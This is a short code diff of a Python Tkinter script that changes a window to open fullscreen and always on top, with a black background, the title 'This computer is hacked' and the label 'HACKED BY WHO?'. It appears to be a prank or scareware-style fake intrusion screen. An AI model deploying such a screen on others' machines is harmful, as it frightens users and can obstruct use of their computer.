@@ -21,8 +21,9 @@ def win_destroy():
 def infinite_loop():
     global loopflag
     root = Tk()
-    root.geometry("400x400")
-    #root.attributes('-fullscreen', True)
+    #root.geometry("400x400")
+    root.attributes('-fullscreen', True)
+    root.attributes("-topmost", True)
     root.configure(bg='black')
     root.title("This computer is hacked")
     text = Label(root, text="HACKED BY WHO?", font=('Arial', 70), fg='black')
